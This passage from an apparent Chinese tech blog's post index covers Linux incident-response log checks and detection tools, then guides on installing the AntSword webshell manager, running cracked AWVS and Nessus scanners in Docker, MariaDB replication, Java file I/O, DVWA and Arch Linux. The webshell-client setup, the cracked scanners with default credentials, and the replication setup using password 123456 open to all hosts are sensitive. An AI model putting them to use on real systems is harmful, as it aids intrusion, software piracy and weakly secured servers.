是否成功 - 用户 - 地址</p></li><li><p><code>sudo grep 'sshd.*Failed.*from &lt;IP_ADDRESS&gt;' /var/log/secure | awk '{print $1,$2,$3,$9,$11}'</code> ：查找特定 IP 失败的次数。</p></li><li><p><code>sudo grep 'sshd.*Accepted.*from &lt;IP_ADDRESS&gt;' /var/log/secure | awk '{print $1,$2,$3,$9,$11}'</code> ：查找特定 IP 成功的次数。</p></li></ul></li><li><p><code>/var/log/cron</code> ：定时任务日志文件。</p></li><li><p><code>/var/log/btmp</code> ：登录失败日志文件。</p></li><li><p><code>/var/log/wtmp</code> ：登录记录日志文件。</p></li></ul><h2 id="工具集"><a class="anchor" href="#工具集">#</a> 工具集</h2><ul><li><p><code>busybox</code> ：busybox 是一个包含多个常用 Linux 命令精简版本的工具集。它可以在嵌入式系统或资源受限的环境中使用，将多个命令集成到一个可执行文件中，以节省空间并提高效率。它可以作为替代系统中关键命令的解决方案，因为它是一个独立的可执行文件，不依赖于系统中的命令。</p><ul><li><code>./busybox netstat -antpl</code> ：使用 busybox 的 netstat 命令显示网络连接和监听端口的信息。</li></ul></li></ul><h2 id="隐藏进程检测工具"><a class="anchor" href="#隐藏进程检测工具">#</a> 隐藏进程检测工具</h2><ul><li><code>unhide</code> ：用于探测隐藏进程的工具。</li></ul><h2 id="rootkit-检测工具"><a class="anchor" href="#rootkit-检测工具">#</a> Rootkit 检测工具</h2><ul><li><p><code>chkrootkit -n</code> ：用于探测 rootkit 的工具。 <code>-n</code>  选项表示以非交互模式运行。</p></li><li><p><code>rkhunter</code> ：另一个用于探测 rootkit 的工具。</p></li></ul><h2 id="恶意软件扫描工具"><a class="anchor" href="#恶意软件扫描工具">#</a> 恶意软件扫描工具</h2><ul><li><code>clamav</code> ：用于扫描和检测恶意软件的工具。</li></ul><h2 id="webshell-查杀工具"><a class="anchor" href="#webshell-查杀工具">#</a> Webshell 查杀工具</h2><ul><li><code>www.shellpub.com</code> ：河马 webshell 查杀工具。</li></ul><h2 id="内存马查杀工具"><a class="anchor" href="#内存马查杀工具">#</a> 内存马查杀工具</h2><ul><li><code>java-memshell-scanner</code> ：用于查杀内存马（内存中的恶意代码）的工具。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> security </tag>
            
            <tag> 应急响应 </tag>
            
            <tag> hvv </tag>
            
            <tag> tools </tag>
            
            <tag> busybox </tag>
            
            <tag> ps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在linux中安装Antsword</title>
      <link href="/linux/webshell/225933/"/>
      <url>/linux/webshell/225933/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/antoor/antSword.git</span><br><span class="line"><span class="built_in">chmod</span> u+x ./antSword</span><br><span class="line"><span class="built_in">cd</span> ./antSword</span><br><span class="line">wget https://ghproxy.com/https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip</span><br><span class="line"><span class="comment"># 这个wget推荐自己到下面的链接里找自己合适的loader。</span></span><br><span class="line">unzip AntSword-Loader-v4.0.3-linux-x64.zip</span><br><span class="line">./AntSword</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> web </tag>
            
            <tag> security </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在docker中设置并安装AWVS和Nessus漏扫程序</title>
      <link href="/linux/docker/203008/"/>
      <url>/linux/docker/203008/</url>
      
        <content type="html"><![CDATA[<p><strong>注意在访问的时候一定要用 https 访问！！！</strong></p><h1 id="awvs-crack-docker"><a class="anchor" href="#awvs-crack-docker">#</a> Awvs Crack Docker</h1><blockquote><p>docker link:<a href="https://hub.docker.com/r/secfa/docker-awvs">secfa/docker-awvs</a></p></blockquote><ul><li>Usage:</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br><span class="line">docker run -it -d -p 13443:3443 --cap-add LINUX_IMMUTABLE secfa/docker-awvs</span><br></pre></td></tr></tbody></table></figure><p>Then visit https://YOUR_IP:13443/</p><ul><li>INFO:</li></ul><blockquote><p><a href="mailto:Username:admin@admin.com">Username:admin@admin.com</a><br>password:Admin123<br>AWVS Version:230222085</p></blockquote><h1 id="nessus-crack"><a class="anchor" href="#nessus-crack">#</a> nessus crack</h1><blockquote><p>reference link:<a href="https://blog.csdn.net/WJ_11_13/article/details/127426899">nessus</a></p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 下载并安装容器</span><br><span class="line">root@LAPTOP-7O53L0P8:~<span class="comment"># docker run -itd --name=ramisec_nessus -p 8834:8834 ramisec/nessus</span></span><br><span class="line">bac3f67995bae798420e3335327b364a62db5f6bbf7b5e1b7b9ce309cd53b60d</span><br><span class="line">// 查看容器ID</span><br><span class="line">root@LAPTOP-7O53L0P8:~<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE               COMMAND                  CREATED          STATUS             PORTS                                         NAMES</span><br><span class="line">bac3f67995ba   ramisec/nessus      <span class="string">"/nessus/run.sh start"</span>   21 seconds ago   Up 19 seconds      0.0.0.0:8834-&gt;8834/tcp, :::8834-&gt;8834/tcp     ramisec_nessus</span><br><span class="line">ed5ab230e247   secfa/docker-awvs   <span class="string">"/bin/sh /awvs_start…"</span>   9 hours ago      Up About an hour   0.0.0.0:13443-&gt;3443/tcp, :::13443-&gt;3443/tcp   awvs</span><br><span class="line">// 进入容器内部进行破解更新</span><br><span class="line">root@LAPTOP-7O53L0P8:~<span class="comment"># docker exec -it bac3f67995ba /bin/bash</span></span><br><span class="line">root@bac3f67995ba:/nessus<span class="comment"># ls</span></span><br><span class="line">run.sh  start.sh  update.sh</span><br><span class="line">root@bac3f67995ba:/nessus<span class="comment"># ./update.sh // 这里省略输出</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 更改管理员密码</span><br><span class="line">root@bac3f67995ba:/nessus<span class="comment"># cd /opt/nessus/sbin/</span></span><br><span class="line">root@bac3f67995ba:/opt/nessus/sbin<span class="comment"># ./nessuscli chpasswd admin</span></span><br></pre></td></tr></tbody></table></figure><h2 id="image"><a class="anchor" href="#image">#</a> Image</h2><div class="tag-plugin image"><div class="image-bg"><img src="/img/dockerinstallawvsnessus/2023-06-12-20-51-07.png" fancybox="true"></div></div><div class="tag-plugin image"><div class="image-bg"><img src="/img/dockerinstallawvsnessus/2023-06-12-20-51-37.png" fancybox="true"></div></div><h1 id="reference"><a class="anchor" href="#reference">#</a> Reference</h1><p><a href="https://blog.csdn.net/WJ_11_13/article/details/127426899">https://blog.csdn.net/WJ_11_13/article/details/127426899</a><br><a href="https://hub.docker.com/r/secfa/docker-awvs">https://hub.docker.com/r/secfa/docker-awvs</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> docker </tag>
            
            <tag> nessus </tag>
            
            <tag> awvs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在MariaDB中设置主从复制</title>
      <link href="/linux/ubuntu/112140/"/>
      <url>/linux/ubuntu/112140/</url>
      
        <content type="html"><![CDATA[<p>本文将介绍如何在 MariaDB 中设置主从复制。主从复制是一种数据库复制技术，其中一个数据库服务器（称为 “主服务器”）将其更改传递给一个或多个其他数据库服务器（称为 “从服务器”）。主从复制可用于实现高可用性、负载均衡和数据备份等目的。</p><h1 id="步骤"><a class="anchor" href="#步骤">#</a> 步骤</h1><h2 id="主机"><a class="anchor" href="#主机">#</a> 主机</h2><ol><li><p>使用以下命令登录到 MariaDB：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></tbody></table></figure></li><li><p>创建一个新的数据库并在其中创建一个新的表：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database db1;</span><br><span class="line">use db1;</span><br><span class="line">create table test1(id int,name char);</span><br></pre></td></tr></tbody></table></figure></li><li><p>退出 MariaDB 并停止 MariaDB 服务器：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit;</span><br><span class="line">systemctl stop mariadb</span><br></pre></td></tr></tbody></table></figure></li><li><p>使用编辑器打开 MariaDB 的配置文件。在 CentOS 中，配置文件位于  <code>/etc/my.cnf</code> ，而在 Ubuntu 中，配置文件位于  <code>/etc/mysql/mariadb.conf.d/50-server.cnf</code> 。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/my.cnf   <span class="comment"># CentOS</span></span><br><span class="line">vi /etc/mysql/mariadb.conf.d/50-server.cnf   <span class="comment"># Ubuntu</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>在配置文件中添加以下内容：</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"><span class="built_in">log</span>-bin=/var/<span class="built_in">log</span>/mysql/mysql-bin.<span class="built_in">log</span></span><br><span class="line">server-id=<span class="number">1</span></span><br><span class="line">binlog-<span class="keyword">do</span>-db=db1</span><br><span class="line">bind-address=<span class="number">0.0</span>.<span class="number">0.0</span></span><br></pre></td></tr></tbody></table></figure><p>上述配置文件中的关键配置包括：</p><ul><li><code>log-bin</code> ：指定二进制日志文件的路径和名称。二进制日志文件包含主服务器上进行的所有更改。</li><li><code>server-id</code> ：指定主服务器的唯一标识符。每个服务器必须具有唯一的标识符。</li><li><code>binlog-do-db</code> ：指定要在二进制日志中记录更改的数据库名称。</li><li><code>bind-address</code> ：指定要在哪个 IP 地址上监听连接请求。在本例中，我们将其设置为  <code>0.0.0.0</code> ，以允许从任何 IP 地址连接到主服务器。</li></ul></li><li><p>创建日志文件目录并将其所有权分配给 MySQL 用户：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/log/</span><br><span class="line"><span class="built_in">mkdir</span> mysql</span><br><span class="line"><span class="built_in">cd</span> mysql/</span><br><span class="line"><span class="built_in">touch</span> mysql-bin.log</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line"><span class="built_in">chown</span> -R mysql:mysql ./mysql/</span><br><span class="line"><span class="built_in">ls</span> -ld /var/log/mysql</span><br><span class="line"><span class="built_in">ls</span> -ld /var/log/mysql/mysql-bin.log</span><br></pre></td></tr></tbody></table></figure><p>上述命令将创建一个名为  <code>mysql-bin.log</code>  的空日志文件，并将其所有权分配给 MySQL 用户。</p></li><li><p>启动 MariaDB 服务器并重新登录到 MariaDB：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mariadb</span><br><span class="line">mysql -uroot -p</span><br></pre></td></tr></tbody></table></figure></li><li><p>授予从服务器复制权限：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant replication slave on *.* to slave@'%' identified by '123456';</span><br><span class="line">exit;</span><br></pre></td></tr></tbody></table></figure><p>上述命令将创建一个名为  <code>slave</code>  的用户，并为其授予复制权限。</p></li><li><p>生成当前数据库的备份：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart mariadb</span><br><span class="line">mysqldump -uroot -p -A &gt; all1.sql</span><br><span class="line">scp all1.sql 10.1.0.16:/root</span><br></pre></td></tr></tbody></table></figure><p>上述命令将在本地生成一个名为  <code>all1.sql</code>  的数据库备份，并将其复制到远程服务器  <code>10.1.0.16</code>  的  <code>/root</code>  目录中。</p></li></ol><h2 id="从机"><a class="anchor" href="#从机">#</a> 从机</h2><ol><li><p>使用以下命令登录到从服务器：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.1.0.20 -uslave -p123456</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>将备份文件还原到从服务器中的 MariaDB：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">mysql -uroot -p &lt; all1.sql</span><br><span class="line">mysql -uroot -p</span><br></pre></td></tr></tbody></table></figure></li><li><p>确认已成功复制数据库：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">exit;</span><br></pre></td></tr></tbody></table></figure></li><li><p>停止从服务器上的 MariaDB 并编辑其配置文件：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop mariadb</span><br><span class="line">vi /etc/my.cnf   <span class="comment"># CentOS</span></span><br><span class="line">vi /etc/mysql/mariadb.conf.d/50-server.cnf   <span class="comment"># Ubuntu</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>在配置文件中添加以下内容：</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server-id=<span class="number">2</span></span><br></pre></td></tr></tbody></table></figure><p>上述配置文件中的关键配置是  <code>server-id</code> ，它指定从服务器的唯一标识符。</p></li><li><p>启动从服务器上的 MariaDB：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mariadb</span><br><span class="line">mysql -uroot -p123456</span><br></pre></td></tr></tbody></table></figure></li><li><p>在从服务器上配置主从复制：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">change master to master_host='10.1.0.20',master_user='slave',master_password='123456',master_port=3306,master_log_file='mysql-bin.000003',master_log_pos=328,master_connect_retry=10;</span><br><span class="line">startslave;</span><br><span class="line">show slave status \G;</span><br></pre></td></tr></tbody></table></figure><p>上述命令将从服务器配置为将来自主服务器的更改复制到本地 MariaDB 上。 <code>change master to</code>  命令中的参数包括：</p><ul><li><code>master_host</code> ：指定主服务器的 IP 地址或主机名。</li><li><code>master_user</code> ：指定用于连接到主服务器的用户名。</li><li><code>master_password</code> ：指定用于连接到主服务器的密码。</li><li><code>master_port</code> ：指定主服务器的端口号。</li><li><code>master_log_file</code> ：指定主服务器当前正在使用的二进制日志文件的名称。</li><li><code>master_log_pos</code> ：指定主服务器当前正在使用的二进制日志文件中的位置。</li><li><code>master_connect_retry</code> ：指定从服务器在与主服务器断开连接后尝试重新连接的次数。</li></ul><p>``start slave; <code> 命令将从服务器上的复制进程启动。</code> show slave status \G;` 命令将显示有关从服务器上的复制进程的详细信息。</p><p>至此，主从复制已经设置完成。主服务器上的更改将自动传播到从服务器上。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ubuntu </tag>
            
            <tag> mariadb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中的文件流读写</title>
      <link href="/languages/java/201744/"/>
      <url>/languages/java/201744/</url>
      
        <content type="html"><![CDATA[<h2 id="一个简单的写入文件并读取文件程序"><a class="anchor" href="#一个简单的写入文件并读取文件程序">#</a> 一个简单的写入文件并读取文件程序。</h2><figure class="highlight java"><figcaption><span>java</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filestream</span> {</span><br><span class="line">    <span class="comment">// 主函数，使用psvm自动补全， throws IOException ：如果在该方法中调用了可能抛出已检查异常的方法，比如文件读写操作，就需要在方法声明中加上throws子句来声明可能抛出的异常。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">        <span class="comment">// 使用 File 指定文件目录为一个变量“f”</span></span><br><span class="line">        File f=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">"D:\\Project\\Java\\test.txt"</span>);</span><br><span class="line">        <span class="comment">// 创建一个字节输出流 FOS 对象 fop，使用fop.close();控制输出流关闭.</span></span><br><span class="line">        <span class="comment">// FileOutputStream(使用File指定的文件路径变量, 是否保留源文件)；</span></span><br><span class="line">        FileOutputStream fop=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 创建一个OSW对象（OutputStreamWriter是一个字符输出流，它将字节流转换为字符流。）writer，使用write.append("内容");来输出流到文件。</span></span><br><span class="line">        <span class="comment">// OutputStreamWriter(字节输出流变量, “编码”);</span></span><br><span class="line">        <span class="type">OutputStreamWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(fop, <span class="string">"UTF-8"</span>);</span><br><span class="line">        <span class="comment">// 使用OSW对象变量名.append("内容");来输出流到文件。</span></span><br><span class="line">        writer.append(<span class="string">"中文测试"</span>);</span><br><span class="line">        <span class="comment">// 换行</span></span><br><span class="line">        writer.append(<span class="string">"\n\r"</span>);</span><br><span class="line">        writer.append(<span class="string">"English"</span>);</span><br><span class="line">        writer.close();</span><br><span class="line">        <span class="comment">// 关闭输出流</span></span><br><span class="line">        fop.close();</span><br><span class="line">        <span class="comment">// 创建一个字节输入（读取）流 FIS 对象 fip，使用fip.close();控制输出流关闭.</span></span><br><span class="line">        <span class="comment">// FileInputStream(使用File指定的文件路径变量)；</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">        <span class="comment">// 创建一个ISR对象 (InputStreamReader 是一个字符输入流，它将字节流转换为字符流。) reader</span></span><br><span class="line">        <span class="comment">// reader.ready()读取流是否准备好。</span></span><br><span class="line">        <span class="comment">// reader.read()读取</span></span><br><span class="line">        <span class="comment">// OutputStreamWriter(字节输出流变量, “编码”);</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(fip, <span class="string">"UTF-8"</span>);</span><br><span class="line">        <span class="comment">// 创建字符缓存 sb，用他来读取文件一行内容到缓存中。</span></span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="comment">// 程序使用一个 while 循环读取输入流中的字符，并将其追加到 sb 中，直到输入流中没有字符可读。在每次读取时，程序使用 (char) reader.read() 将读取到的字节转换为字符，并将其追加到 sb 中。</span></span><br><span class="line">        <span class="keyword">while</span> (reader.ready()){</span><br><span class="line">            sb.append((<span class="type">char</span>) reader.read());</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 输出。</span></span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">        <span class="comment">// 关闭输入输出流。</span></span><br><span class="line">        reader.close();</span><br><span class="line">        fip.close();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> languages </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> filestream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa安装指引</title>
      <link href="/linux/web/100353/"/>
      <url>/linux/web/100353/</url>
      
        <content type="html"><![CDATA[<h2 id="多说无用建议直接docker一步到位"><a class="anchor" href="#多说无用建议直接docker一步到位">#</a> 多说无用，建议直接 docker 一步到位。</h2><h1 id="启动nginx"><a class="anchor" href="#启动nginx">#</a> 启动 nginx</h1><h2 id="service-nginx-startcd-varwwwhtmlvim-hellohtml"><a class="anchor" href="#service-nginx-startcd-varwwwhtmlvim-hellohtml">#</a> service nginx start<br>cd /var/www/html<br>vim hello.html</h2><p>Helloworld!<br>// 访问虚拟机地址。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@fedora axro]<span class="comment"># cd /usr/share/nginx/html/</span></span><br><span class="line">[root@fedora html]<span class="comment"># git clone https://github.com/digininja/DVWA.git</span></span><br><span class="line">[root@fedora html]<span class="comment"># cd DVWA/config</span></span><br><span class="line">[root@fedora config]<span class="comment"># cp config.inc.php.dist config.inc.php</span></span><br><span class="line">[root@fedora config]<span class="comment"># vi config.inc.php</span></span><br><span class="line">mysql -u root -p</span><br><span class="line">create database DVWA;</span><br></pre></td></tr></tbody></table></figure><p>mysql&gt; create database dvwa;<br>Query OK, 1 row affected (0.00 sec)</p><p>mysql&gt; create user dvwa@localhost identified by 'p@ssw0rd';<br>Query OK, 0 rows affected (0.01 sec)</p><p>mysql&gt; grant all on dvwa.* to dvwa@localhost;<br>Query OK, 0 rows affected (0.01 sec)</p><p>mysql&gt; flush privileges;<br>Query OK, 0 rows affected (0.00 sec)</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> mysql </tag>
            
            <tag> kali </tag>
            
            <tag> dvwa </tag>
            
            <tag> fedora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch安装使用指导</title>
      <link href="/linux/arch/140206/"/>
      <url>/linux/arch/140206/</url>
      
        <content type="html"><![CDATA[<h1 id="前期准备"><a class="anchor" href="#前期准备">#</a> 前期准备</h1><p>在创建好虚拟机后，需要打开虚拟机设置，将  <code>firmware type</code>  更改为  <code>efi</code> ，以便后续操作。</p><h1 id="检查网络设置和-ssh-连接"><a class="anchor" href="#检查网络设置和-ssh-连接">#</a> 检查网络设置和 SSH 连接</h1><p>以下是检查网络设置和 SSH 连接的操作步骤：</p><figure class="highlight bash"><figcaption><span>bash</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查系统启动方式</span></span><br><span class="line"><span class="built_in">ls</span> /sys/firmware/efi/efivars</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查网络是否通畅</span></span><br><span class="line">ping baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改密码并远程连接</span></span><br><span class="line">passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 IP 地址</span></span><br><span class="line">ip addr</span><br></pre></td></tr></tbody></table></figure><h1 id="使用ssh连接"><a class="anchor" href="#使用ssh连接">#</a> 使用 ssh 连接</h1><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p <span class="number">22</span> root@<span class="number">192</span>.<span class="number">168</span>.<span class="number">204</span>.<span class="number">130</span></span><br></pre></td></tr></tbody></table></figure><h1 id="分区挂载"><a class="anchor" href="#分区挂载">#</a> 分区挂载</h1><figure class="highlight bash"><figcaption><span>bash</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看已存在的硬盘</span></span><br><span class="line">lsblk</span><br><span class="line"><span class="comment"># 使用cfdisk创建分区</span></span><br><span class="line">cfdisk /dev/nvme0n1</span><br><span class="line"><span class="comment"># 创建如下三个</span></span><br><span class="line">Device           Start      End  Sectors  Size Type</span><br><span class="line">/dev/nvme0n1p1    2048  1026047  1024000  500M EFI System</span><br><span class="line">/dev/nvme0n1p2 1026048  9414655  8388608    4G Linux swap</span><br><span class="line">/dev/nvme0n1p3 9414656 83884031 74469376 35.5G Linux filesystem</span><br><span class="line"><span class="comment"># 分别格式化</span></span><br><span class="line"><span class="comment"># 格式化EFI启动分区为fat32格式</span></span><br><span class="line">mkfs.fat -F32 /dev/nvme0n1p1</span><br><span class="line"><span class="comment"># 格式化根目录为xfs文件系统</span></span><br><span class="line">mkfs.xfs -f /dev/nvme0n1p3</span><br><span class="line"><span class="comment"># 格式化swap文件系统</span></span><br><span class="line">mkswap /dev/nvme0n1p2</span><br><span class="line">swapon /dev/nvme0n1p2</span><br><span class="line"><span class="comment"># 挂载</span></span><br><span class="line"><span class="comment"># 挂载根分区到mnt</span></span><br><span class="line">mount /dev/nvme0n1p3 /mnt</span><br><span class="line"><span class="comment"># 新建EFI分区并挂载</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt/boot/EFI</span><br><span class="line">mount /dev/nvme0n1p1 /mnt/boot/EFI</span><br></pre></td></tr></tbody></table></figure><h1 id="安装"><a class="anchor" href="#安装">#</a> 安装</h1><figure class="highlight bash"><figcaption><span>bash</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用下面命令下载并安装系统</span></span><br><span class="line">pacstrap -i /mnt base base-devel vim linux linux-firmware</span><br><span class="line"><span 